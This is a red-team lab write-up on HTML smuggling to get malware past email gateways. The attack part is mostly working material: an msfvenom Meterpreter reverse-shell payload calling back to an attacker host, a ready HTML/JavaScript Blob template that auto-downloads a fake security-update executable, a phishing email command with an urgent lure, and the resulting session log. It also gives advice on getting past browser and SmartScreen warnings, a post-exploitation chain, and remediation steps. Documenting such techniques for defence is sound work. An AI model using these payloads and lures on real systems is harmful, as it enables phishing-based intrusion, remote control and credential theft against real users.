> **English** | [Italiano](README.md)

# HTML Smuggling - Bypass Email Gateway via Client-Side Assembly

> - **Phase:** Social Engineering - Payload Delivery via HTML Smuggling
> - **Visibility:** Low in transit (the HTML file is legitimate to filters) / High at execution (the reassembled payload triggers AV/EDR at download or execution)
> - **Prerequisites:** Payload generated with msfvenom or custom; JavaScript knowledge (Blob API, anchor element); web server or email for HTML file delivery; handler listening for the callback
> - **Output:** SE-008 (email gateway bypass via JavaScript blob download, payload .exe reassembled client-side - severity High)

- **Operating Environment:** Kali Linux Purple (Attacker), Windows 10 VM with Chrome/Edge (Victim)
- **Target:** Simulated email gateway (Mailhog), user opening HTML attachment
- **Documented Techniques:** JavaScript Blob API, Base64 Encoding, Auto-Download Trigger

---

## Executive Summary

HTML Smuggling is a delivery technique that leverages native browser functionality to assemble a malicious file directly on the victim's machine. Unlike traditional attachments (.exe, .docm) that are analyzed by email gateway filters in transit, HTML Smuggling delivers only an HTML file containing legitimate JavaScript code. The payload is Base64-encoded within the script and is decoded, assembled into a Blob, and offered as an automatic download only when the victim opens the file in the browser.

This technique has been used in documented real-world APT campaigns: Nobelium/APT29 (SolarWinds) employed it in 2021 to distribute Cobalt Strike, and several ransomware groups currently use it to bypass perimeter controls.

---

## HTML Smuggling: Server-Side Filter Bypass

**Finding ID:** `SE-008` | **Severity:** `High`

### Operational Context

The lab created an HTML file that, when opened in the victim's browser, automatically assembles and downloads a payload .exe via the JavaScript Blob API. The HTML file was sent as an email attachment through a simulated email gateway (Mailhog): the gateway did not detect malicious content because the payload does not exist as a file until the moment it is opened in the browser.

### PoC - Phase 1: Payload Generation and Encoding

```Bash
# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o update_security.exe
```

```
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: update_security.exe
```

```Bash
# Base64 encoding for embedding
base64 -w 0 update_security.exe > payload_b64.txt
cat payload_b64.txt | wc -c
```

```
9560                                                        <-- Base64 size (compact)
```

### PoC - Phase 2: HTML File Creation with Smuggling

```html
<!-- security_update.html -->
<html>
<head><title>Aggiornamento di Sicurezza</title></head>
<body>
<h2>Download in corso...</h2>
<p>Il tuo aggiornamento di sicurezza si avviera automaticamente.</p>
<script>
// Payload encoded in Base64
var payload_b64 = "TVqQAAMAAAAEAAAA..."; // [content from payload_b64.txt]

// Base64 decode -> byte array
var byteChars = atob(payload_b64);
var byteArray = new Uint8Array(byteChars.length);
for (var i = 0; i < byteChars.length; i++) {
    byteArray[i] = byteChars.charCodeAt(i);
}

// Blob creation and automatic download trigger
var blob = new Blob([byteArray], {type: 'application/octet-stream'});
var url = window.URL.createObjectURL(blob);                 // <-- file assembled in memory
var a = document.createElement('a');
a.href = url;
a.download = 'SecurityUpdate_v3.2.1.exe';                  // <-- convincing file name
document.body.appendChild(a);
a.click();                                                  // <-- automatic download
</script>
</body>
</html>
```

### PoC - Phase 3: Email Delivery and Bypass Verification

```Bash
# Sending email with HTML attachment via SMTP (or GoPhish)
swaks --to victim@company-lab.local --from security@company-lab.local \
  --server 127.0.0.1:25 \
  --header "Subject: [URGENTE] Aggiornamento di sicurezza obbligatorio" \
  --body "Aprire il file allegato per installare l'aggiornamento." \
  --attach security_update.html
```

```
=== Trying 127.0.0.1:25...
=== Connected to 127.0.0.1.
 -> 250 Ok: queued                                          <-- email accepted by gateway
                                                            <-- no alert: just an HTML file
```

### PoC - Phase 4: Execution and Callback

```
# The victim opens the HTML attachment in the browser:
# 1. Chrome opens security_update.html
# 2. JavaScript executes automatically
# 3. The browser shows "SecurityUpdate_v3.2.1.exe" in the download bar
# 4. If the victim runs the file -> reverse shell

[*] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.120:49821)    <-- SE-008
```

### Remediation

- **Immediate action:** block execution of the downloaded payload; quarantine the original HTML file; analyze the JavaScript code to extract IOCs (callback URL, file name)
- **Structural action:** configure email gateway for HTML attachment sandboxing (isolated environment execution that detects automatic downloads); enable SmartScreen for downloaded files; browser isolation for emails with HTML attachments; disable JavaScript rendering in email attachments (Outlook: "Read as plain text")
- **Verification:** send a test HTML file with a benign payload - the gateway must detect the automatic download behavior and block or quarantine the attachment

---

## Lab Experience

The first attempt used a 7 KB .exe payload embedded in the HTML file. The resulting HTML file was approximately 15 KB - a perfectly plausible size for an email attachment. Verification with Mailhog (test email gateway) confirmed that the HTML file transits without any alerts: to the gateway, it is a legitimate HTML attachment.

The issue that emerged during testing was the behavior of modern browsers: Chrome displays a warning in the download bar for downloaded .exe files, and SmartScreen on Windows can block execution. To circumvent this (in a real engagement), less suspicious formats are used: .iso, .zip (containing the payload), or the user is redirected to an instruction page that guides them to accept the warnings.

An important observation: the technique also works when the HTML file is hosted on a web server (not only as an email attachment). In this case, the email link points to the HTML page and the download starts when the victim visits the URL. This approach is stealthier because there is no attachment to analyze.

---

## Theoretical Analysis: Why Gateways Fail

Email gateway filters operate with a static analysis model: they inspect attachments as files, looking for malware signatures, analyzing PE (Portable Executable) structures, and sandboxing executable files. HTML Smuggling exploits the architectural gap between server-side analysis and client-side execution.

The HTML file contains only legitimate JavaScript code - the `atob()`, `Blob()`, `URL.createObjectURL()` functions are standard browser APIs, used by millions of legitimate web applications for file download management. The payload is Base64-encoded, which to a filter is simply a text string. The malicious file does not exist as an analyzable entity until the moment the victim's browser executes the JavaScript and assembles the bytes in memory.

The technique has been documented in high-profile APT campaigns: Nobelium (APT29) used it in May 2021 to distribute Cobalt Strike beacons disguised as security updates. The Mango Sandstorm group (formerly PHOSPHORUS) employed it in 2023 to distribute backdoors against Israeli organizations. The technique's proliferation prompted Microsoft to introduce the ASR rule "Block JavaScript or VBScript from launching downloaded executable content" as a specific countermeasure.

---

## Real-World Scenario: Post-Exploitation Projection

> This section describes how this finding would fit into a real engagement.

### Attacker Perspective (Red Team)

**Starting point:** payload .exe downloaded and executed by the victim (SE-008).

**Projected kill chain:**

```
[SE-008] HTML Smuggling -> payload downloaded -> execution
        |
        v
Meterpreter reverse shell -> process migration (evasion)
        |
        v
Credential Harvesting -> Mimikatz / LSASS dump
        |
        v
Lateral Movement -> PsExec / WMI to internal hosts
```

### Defender Perspective (Blue Team)

**IOCs to monitor:**
- Download of .exe from local HTML file (Sysmon Event ID 11: FileCreate with Zone.Identifier)
- Child process of browser (chrome.exe/msedge.exe) executing downloaded .exe
- Email HTML attachments with obfuscated JavaScript or long Base64 strings
- ASR rule trigger: "Block JavaScript from launching downloaded executable content"

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | HTML file creation with Base64-embedded payload |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | HTML file sent as email attachment (SE-008) |
| Defense Evasion | Obfuscated Files or Information: HTML Smuggling | `T1027.006` | Payload assembled client-side via JavaScript Blob API |
| Execution | User Execution: Malicious File | `T1204.002` | Victim executes the .exe file downloaded by the browser |
| Execution | Command and Scripting Interpreter: JavaScript | `T1059.007` | JavaScript in HTML file decodes and assembles the payload |
| Command and Control | Non-Standard Port | `T1571` | Reverse TCP Meterpreter on port 4444 |

---

> **Note:** All documented activities were conducted in a virtualized lab environment. Malicious HTML files were tested exclusively on virtual machines owned by the author.
